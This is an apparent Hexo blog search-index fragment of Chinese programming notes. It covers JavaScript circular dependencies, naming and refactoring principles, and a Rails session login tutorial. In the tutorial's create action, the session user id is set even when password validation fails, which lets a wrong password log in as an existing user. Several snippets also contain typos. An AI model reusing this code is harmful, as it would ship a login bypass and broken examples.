a</span><br></pre></td></tr></table></figure><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> b.js</span><br><span class="line"><span class="keyword">import</span> a <span class="keyword">from</span> <span class="string">&#x27;./a.js&#x27;</span></span><br><span class="line">const b = &#123;</span><br><span class="line">  value: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">  getA: <span class="function"><span class="params">()</span> =&gt;</span> a.value + <span class="string">&#x27; from b.js&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> b</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line">import <span class="selector-tag">a</span> from <span class="string">&#x27;./a.js&#x27;</span></span><br><span class="line">import <span class="selector-tag">b</span> from <span class="string">&#x27;./b.js&#x27;</span></span><br><span class="line">console<span class="selector-class">.log</span>(<span class="selector-tag">a</span><span class="selector-class">.getB</span>())</span><br><span class="line">console<span class="selector-class">.log</span>(<span class="selector-tag">b</span><span class="selector-class">.getA</span>())</span><br></pre></td></tr></table></figure><blockquote><p>a.js 和 b.js 就是循环依赖，但是 a 和 b 都有初始值，所以不会循环计算</p></blockquote><h2 id="有的循环依赖有问题"><a href="#有的循环依赖有问题" class="headerlink" title="有的循环依赖有问题"></a>有的循环依赖<strong>有</strong>问题</h2><h2 id="有的循环依赖冇问题"><a href="#有的循环依赖冇问题" class="headerlink" title="有的循环依赖冇问题"></a>有的循环依赖<strong>冇</strong>问题</h2><h5 id="所以最好别用循环依赖，以防万一"><a href="#所以最好别用循环依赖，以防万一" class="headerlink" title="所以最好别用循环依赖，以防万一"></a>所以最好别用循环依赖，以防万一</h5>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码优化基本原则</title>
      <link href="/Blog/2021/03/01/javascript/%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%88%99/index/"/>
      <url>/Blog/2021/03/01/javascript/%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%88%99/index/</url>
      
        <content type="html"><![CDATA[<h2 id="代码优化基本原则"><a href="#代码优化基本原则" class="headerlink" title="代码优化基本原则"></a>代码优化基本原则</h2><ol><li>易读性优先</li><li>如果不是性能瓶颈，就不要为了性能而改写代码</li><li>复杂性守恒原则：无论你怎么写代码，复杂性都是不会消失的<br>推论：如果逻辑很复杂，那么代码看起来就应该是复杂的。如果逻辑很简单，代码看起来就应该是简单的。</li></ol><h2 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h2><p><strong>程序员三大难题</strong></p><ol><li>变量命名</li><li>缓存失效</li><li>循环边界</li></ol><p>可见变量命名的重要性。</p><p><a href="https://www.google.com/search?q=github+%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83" title="null">网上有很多命名规范</a>，大家可以参考。这里只讲基本原则。</p><ol><li><p>注意词性</p><ul><li><p>普通变量&#x2F;属性用「名词」</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Frank&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> student = &#123;</span><br><span class="line">    grade: <span class="number">3</span>,</span><br><span class="line">    <span class="keyword">class</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>bool变量&#x2F;属性用「形容词」或者「be动词」或者「情态动词」或者「hasX」</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    dead: <span class="literal">false</span>, <span class="comment">// 如果是形容词，前面就没必要加 is，比如isDead 就很废话</span></span><br><span class="line">    canSpeak: <span class="literal">true</span>, <span class="comment">//情态动词有 can、should、will、need 等，情态动词后面接动词</span></span><br><span class="line">    isVip: <span class="literal">true</span>, <span class="comment">// be 动词有 is、was 等，后面一般接名词</span></span><br><span class="line">    hasChildren: <span class="literal">true</span>, <span class="comment">// has 加名词</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>普通函数&#x2F;方法用「动词」开头</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    <span class="title function_">run</span>(<span class="params"></span>)&#123;&#125;, <span class="comment">// 不及物动词</span></span><br><span class="line">    <span class="title function_">drinkWater</span>(<span class="params"></span>)&#123;&#125;, <span class="comment">// 及物动词</span></span><br><span class="line">    <span class="title function_">eat</span>(<span class="params">foo</span>)&#123;&#125;, <span class="comment">// 及物动词加参数（参数是名词）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>回调、钩子函数用「介词」开头，或用「动词的现在完成时态」</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    <span class="title function_">beforeDie</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">afterDie</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="comment">// 或者</span></span><br><span class="line">    <span class="title function_">willDie</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">    <span class="title function_">dead</span>(<span class="params"></span>)&#123;&#125; <span class="comment">// 这里跟 bool 冲突，你只要不同时暴露 bool dead 和函数 dead 就行，怕冲突就用上面的 afterDie</span></span><br><span class="line">&#125;</span><br><span class="line">button.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, onButtonClick)</span><br><span class="line"><span class="keyword">var</span> component = &#123;</span><br><span class="line">    <span class="title function_">beforeCreate</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">created</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">beforeMount</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">mounted</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">beforeUpdate</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">updated</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">activated</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">deactivated</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">beforeDestroy</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">destroyed</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    <span class="title function_">errorCaptured</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>容易混淆的地方加前缀</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div1<span class="selector-class">.classList</span><span class="selector-class">.add</span>(<span class="string">&#x27;active&#x27;</span>) <span class="comment">// DOM 对象</span></span><br><span class="line">div2<span class="selector-class">.addClass</span>(<span class="string">&#x27;active&#x27;</span>) <span class="comment">// jQuery 对象</span></span><br><span class="line">不如改成</span><br><span class="line">domDiv1 或 elDiv1<span class="selector-class">.classList</span><span class="selector-class">.add</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line"><span class="variable">$div2</span><span class="selector-class">.addClass</span>(<span class="string">&#x27;active&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>属性访问器函数可以用名词</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$div</span>.text() <span class="regexp">//</span> 其实是 <span class="variable">$div</span>.getText()</span><br><span class="line"><span class="variable">$div</span>.text(<span class="string">&#x27;hi&#x27;</span>) <span class="regexp">//</span> 其实是 <span class="variable">$div</span>.setText(<span class="string">&#x27;hi&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li><li><p>注意一致性</p><ul><li><p>介词一致性<br>如果你使用了 before + after，那么就在代码的所有地方都坚持使用<br>如果你使用了 before + 完成时，那么就坚持使用<br>如果你改来改去，就「不一致」了，不一致将导致「不可预测」</p></li><li><p>顺序一致性<br>比如 updateContainerWidth 和 updateHeightOfContainer 的顺序就令人很别扭，同样会引发「不可预测」</p></li><li><p>表里一致性<br>函数名必须完美体现函数的功能，既不能多也不能少。<br>比如</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">getSongs</span>()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">$.get(&#x27;/songs).then((response)&#123;</span></span><br><span class="line">        div.innerText = response.songs</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就违背了表里一致性，getSongs 表示获取歌曲，并没有暗示这个函数会更新页面，但是实际上函数更新了 div，这就是表里不一，正确的写法是</p><ul><li><p>要么纠正函数名</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">getSongsAndUpdateDiv</span>()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">$.get(&#x27;/songs).then((response)&#123;</span></span><br><span class="line">        div.innerText = response.songs</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>要么写成两个函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> get<span class="constructor">Songs()</span>&#123;</span><br><span class="line">    return $.get(&#x27;/songs)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> update<span class="constructor">Div(<span class="params">songs</span>)</span>&#123;</span><br><span class="line">    div.innerText = response.songs</span><br><span class="line">&#125;</span><br><span class="line">get<span class="constructor">Songs()</span>.<span class="keyword">then</span>((response)=&gt;&#123;</span><br><span class="line">    update<span class="constructor">Div(<span class="params">response</span>.<span class="params">songs</span>)</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li><li><p>时间一致性<br>有可能随着代码的变迁，一个变量的含义已经不同于它一开始的含义了，这个时候你需要及时改掉这个变量的名字。<br>这一条是最难做到的，因为写代码容易，改代码难。如果这个代码组织得不好，很可能会出现牵一发而动全身的情况（如全局变量就很难改）</p></li></ul></li></ol><h2 id="改代码"><a href="#改代码" class="headerlink" title="改代码"></a>改代码</h2><p>如果你的代码有单元测试，那么改起来就很放心。如果没有单元测试，就需要用「小步快跑」的策略来修改。</p><p>小步快跑的意思是说，每次只修改一点点，测试通过后，再修改一点点，再测试，再修改一点点……如此反复。</p><p>那么如何修改一点点呢？《重构》这本书介绍了很多方法，但是讲得挺啰嗦的，如果你有时间可以看看。</p><p>我这里只说两个经久不衰的方法。</p><h3 id="一、使用函数来改代码"><a href="#一、使用函数来改代码" class="headerlink" title="一、使用函数来改代码"></a>一、使用函数来改代码</h3><p>步骤：</p><ol><li>将一坨代码放到一个函数里</li><li>将代码依赖的外部变量作为参数</li><li>将代码的输出作为函数的返回值</li><li>给函数取一个合适的名字</li><li>调用这个函数并传入参数</li><li>这个函数里的代码如果超过 5 行，则依然有优化的空间，请回到第 1 步</li></ol><h3 id="二、使用对象来改代码"><a href="#二、使用对象来改代码" class="headerlink" title="二、使用对象来改代码"></a>二、使用对象来改代码</h3><p>如果使用了函数改造法改造后，发现有太多的小函数，则可以使用对象讲这个函数串起来。</p><p>记得我们讲过「this 是函数和对象的桥梁」吗，我们会用 this 来串联这个对象和所有函数。</p><p>最终代码：<a href="http://js.jirengu.com/mimazaboke/1/edit?html,js,output" title="null">http://js.jirengu.com/mimazaboke/1/edit?html,js,output</a></p><h3 id="一些固定的套路"><a href="#一些固定的套路" class="headerlink" title="一些固定的套路"></a>一些固定的套路</h3><ol><li>表驱动编程（《代码大全》里说的）<br>所有一一对应的关系都可以用表来做</li><li>自说明代码（以 API 参数为例）<br>把别人关心的东西放在显眼的位置</li></ol><h2 id="bad-smell（坏味道）"><a href="#bad-smell（坏味道）" class="headerlink" title="bad smell（坏味道）"></a>bad smell（坏味道）</h2><p>有些代码可以用，但是很「臭」。</p><p>哪些代码是有坏味道的</p><ol><li>表里不一的代码</li><li>过时的注释</li><li>逻辑很简单，但是看起来很复杂的代码</li><li>重复的代码</li><li>相似的代码</li><li>总是一起出现的代码</li></ol><h2 id="破窗效应"><a href="#破窗效应" class="headerlink" title="破窗效应"></a>破窗效应</h2><blockquote><p>此理论认为环境中的不良现象如果被放任存在，会诱使人们仿效，甚至变本加厉。一幢有少许破窗的建筑为例，如果那些窗不被修理好，可能将会有破坏者破坏更多的窗户。最终他们甚至会闯入建筑内，如果发现无人居住，也许就在那里定居或者纵火。一面墙，如果出现一些涂鸦没有被清洗掉，很快的，墙上就布满了乱七八糟、不堪入目的东西；一条人行道有些许纸屑，不久后就会有更多垃圾，最终人们会视若理所当然地将垃圾顺手丢弃在地上。这个现象，就是犯罪心理学中的破窗效应。</p></blockquote><p>程序员要做到：只要是经过你手的代码，都会比之前好一点。</p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rails session</title>
      <link href="/Blog/2020/11/03/rails/Rails_session/index/"/>
      <url>/Blog/2020/11/03/rails/Rails_session/index/</url>
      
        <content type="html"><![CDATA[<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><ul><li>在 <code>config/routes</code> 里添加 <code>resources :sessions, only: [:create, :destroy]</code> 只需要这两个 API</li></ul><h2 id="Modal"><a href="#Modal" class="headerlink" title="Modal"></a>Modal</h2><ul><li>手动创建 <code>app/modal/session.rb</code>，因为 session 并不需要存在数据库中，内容<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="keyword">Session</span></span><br><span class="line">  <span class="keyword">include</span> ActiveModel::Model // 不能像 <span class="keyword">user</span> 那样继承 ActiveRecord，但是我们又需要用到 Rails 提供的 <span class="keyword">class</span> 里面的便利方法，所以这里需要引入模块 ActiveModel</span><br><span class="line">  attr_accessor :email, :<span class="keyword">password</span></span><br><span class="line"></span><br><span class="line">  validates_presence_of :email, :<span class="keyword">password</span></span><br><span class="line">  validates_format_of :email, <span class="keyword">with</span>: /.+@.+/, <span class="keyword">if</span>: :email</span><br><span class="line">  validates_length_of :<span class="keyword">password</span>, minimum: <span class="number">6</span>, <span class="keyword">on</span>: [:<span class="keyword">create</span>], <span class="keyword">if</span>: :<span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h2><ul><li>使用命令创建 controller ，<code>bin/rails g controller sessions</code>，追加两个方法<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> SessionsController &lt; ApplicationController</span><br><span class="line">  def <span class="keyword">create</span></span><br><span class="line">    <span class="keyword">session</span> = <span class="keyword">Session</span>.<span class="built_in">new</span> create_params</span><br><span class="line">    <span class="keyword">session</span>.<span class="keyword">validate</span></span><br><span class="line">    render_resource <span class="keyword">session</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  def destroy</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  def create_params</span><br><span class="line">    params.permit(:email, :<span class="keyword">password</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="追加一个自定义的验证，验证邮箱是否存在"><a href="#追加一个自定义的验证，验证邮箱是否存在" class="headerlink" title="追加一个自定义的验证，验证邮箱是否存在"></a>追加一个自定义的验证，验证邮箱是否存在</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="keyword">Session</span></span><br><span class="line">  <span class="keyword">include</span> ActiveModel::Model</span><br><span class="line">  attr_accessor :email, :<span class="keyword">password</span>, :<span class="keyword">user</span></span><br><span class="line"></span><br><span class="line">  validates_presence_of :email, :<span class="keyword">password</span></span><br><span class="line">  <span class="keyword">validate</span> :check_email_present, <span class="keyword">if</span>: :email</span><br><span class="line">  validates_format_of :email, <span class="keyword">with</span>: /.+@.+/, <span class="keyword">if</span>: :email</span><br><span class="line">  validates_length_of :<span class="keyword">password</span>, minimum: <span class="number">6</span>, <span class="keyword">if</span>: :<span class="keyword">password</span></span><br><span class="line">  <span class="keyword">validate</span> :check_email_password_match, <span class="keyword">if</span>: Proc.<span class="built_in">new</span> &#123;|s| s.email.present? <span class="keyword">and</span> s.<span class="keyword">password</span>.present?&#125;</span><br><span class="line"></span><br><span class="line">  def check_email_present</span><br><span class="line">    <span class="keyword">user</span> ||= <span class="keyword">User</span>.find_by_email email</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">user</span>.nil?</span><br><span class="line">      errors.<span class="keyword">add</span> :email, :not_present</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  def check_email_password_match</span><br><span class="line">    <span class="keyword">user</span> ||= <span class="keyword">User</span>.find_by_email email</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">user</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">user</span>.authenticate(<span class="keyword">password</span>)</span><br><span class="line">      errors.<span class="keyword">add</span> :<span class="keyword">password</span>, :not_match</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="attr-accessor-xxx-做了啥"><a href="#attr-accessor-xxx-做了啥" class="headerlink" title="attr_accessor :xxx 做了啥"></a>attr_accessor :xxx 做了啥</h2><ul><li><ol><li>@xxx</li></ol></li><li><ol start="2"><li>def xxx 获取 @xxx 的值</li></ol></li><li><ol start="3"><li>def xxx&#x3D; 赋值给 @xxx</li></ol></li></ul><h5 id="为了避免出错，完善一下上面的代码"><a href="#为了避免出错，完善一下上面的代码" class="headerlink" title="为了避免出错，完善一下上面的代码"></a>为了避免出错，完善一下上面的代码</h5><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class <span class="title class_">Session</span></span><br><span class="line">  include <span class="title class_">ActiveModel</span>::<span class="title class_">Model</span></span><br><span class="line">  attr_accessor <span class="symbol">:email</span>, <span class="symbol">:password</span>, <span class="symbol">:user</span></span><br><span class="line"></span><br><span class="line">  validates_presence_of <span class="symbol">:email</span>, <span class="symbol">:password</span></span><br><span class="line">  validate <span class="symbol">:check_email_present</span>, <span class="symbol">if:</span> <span class="symbol">:email</span></span><br><span class="line">  validates_format_of <span class="symbol">:email</span>, <span class="symbol">with:</span> /.+@.+/, <span class="symbol">if:</span> <span class="symbol">:email</span></span><br><span class="line">  validates_length_of <span class="symbol">:password</span>, <span class="symbol">minimum:</span> <span class="number">6</span>, <span class="symbol">if:</span> <span class="symbol">:password</span></span><br><span class="line">  validate <span class="symbol">:check_email_password_match</span>, <span class="symbol">if:</span> <span class="title class_">Proc</span>.new &#123;|s| s.email.present? <span class="keyword">and</span> s.password.present?&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check_email_present</span></span></span><br><span class="line">    <span class="variable">@user</span> ||= <span class="title class_">User</span>.find_by_email email</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@user</span>.nil?</span><br><span class="line">      errors.add <span class="symbol">:email</span>, <span class="symbol">:not_present</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check_email_password_match</span></span></span><br><span class="line">    <span class="variable">@user</span> ||= <span class="title class_">User</span>.find_by_email email</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@user</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="variable">@user</span>.authenticate(password)</span><br><span class="line">      errors.add <span class="symbol">:password</span>, <span class="symbol">:not_match</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="增加-session-中间件"><a href="#增加-session-中间件" class="headerlink" title="增加 session 中间件"></a>增加 session 中间件</h2><p><code>config/application.rb</code><br><a href="https://edgeguides.rubyonrails.org/api_app.html">https://edgeguides.rubyonrails.org/api_app.html</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config<span class="selector-class">.session_store</span> :cookie_store, key: <span class="string">&#x27;_monery_session_id&#x27;</span></span><br><span class="line">config<span class="selector-class">.middleware</span><span class="selector-class">.use</span> ActionDispatch::Cookies</span><br><span class="line">config<span class="selector-class">.middleware</span><span class="selector-class">.use</span> config<span class="selector-class">.session_store</span>, config.session_options</span><br></pre></td></tr></table></figure><p>增加 session</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def <span class="keyword">create</span></span><br><span class="line">    s = <span class="keyword">Session</span>.<span class="built_in">new</span> create_params</span><br><span class="line">    s.<span class="keyword">validate</span></span><br><span class="line">    render_resource s</span><br><span class="line">    <span class="keyword">session</span>[:current_user_id] = s.<span class="keyword">user</span>.id</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>再给 user 增加一个根据 session_id 获取当前用户的路由<br>config&#x2F;routes</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span> <span class="string">&#x27;/current_user_info&#x27;</span>, <span class="keyword">to</span>: <span class="string">&#x27;user#current_user_info&#x27;</span></span><br></pre></td></tr></table></figure><p>app&#x2F;controllers&#x2F;users_controller.rb</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">current_user_info</span></span></span><br><span class="line">  <span class="variable">@user_id</span> = session[<span class="symbol">:current_user_id</span>]</span><br><span class="line">  <span class="variable">@user</span> = <span class="title class_">User</span>.find_by_id <span class="variable">@user_id</span></span><br><span class="line">  render_resource <span class="variable">@user</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="记住密码"><a href="#记住密码" class="headerlink" title="记住密码"></a><em>记住密码</em></h2><p><em>切记不可把用户密码直接存在 localStorage</em><br>Rails 官方没有提供最佳实践<br>因为做法各不相同<br><strong>思路</strong>：</p><ol><li>当用户记住密码时，带上相关字段发给服务器</li><li>服务器接受以后，下发一个随机数（r）并存在数据库和 session</li><li>当过了一段时间，session 过期以后，只剩下 r 被带上发送给服务器</li><li>服务器检查 r 是否有效且正确（比如记住密码7天有效），有效中就直接派发一个新的 session，</li><li>而数据库需要在 user 表中多增加两个字段 login_token 和 login_token_expired_at 即可</li><li>但是如果需要做多个设备的记住密码，上面方案就不够用了，因为新设备登陆，会覆盖数据库，所以我们就需要新增一张 user 的关联表，用来记录多个 login_token</li></ol><p><img src="/Blog/2020/11/03/rails/Rails_session/index/img.png"></p><h2 id="三句话实现注销功能"><a href="#三句话实现注销功能" class="headerlink" title="三句话实现注销功能"></a>三句话实现注销功能</h2><p>config&#x2F;routes，由于 Rails 定义的 destory 方法需要传一个 id，所以我们需要重新定义一个方法</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">delete</span> <span class="string">&#x27;sessions&#x27;</span>, <span class="built_in">to</span>: <span class="string">&#x27;sessions#destroy&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span></span></span><br><span class="line">    session[<span class="symbol">:current_user_id</span>] = <span class="literal">nil</span></span><br><span class="line">    head <span class="number">200</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Rails </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rails start</title>
      <link href="/Blog/2020/09/20/rails/Rails_start/index/"/>
      <url>/Blog/2020/09/20/rails/Rails_start/index/</url>
      
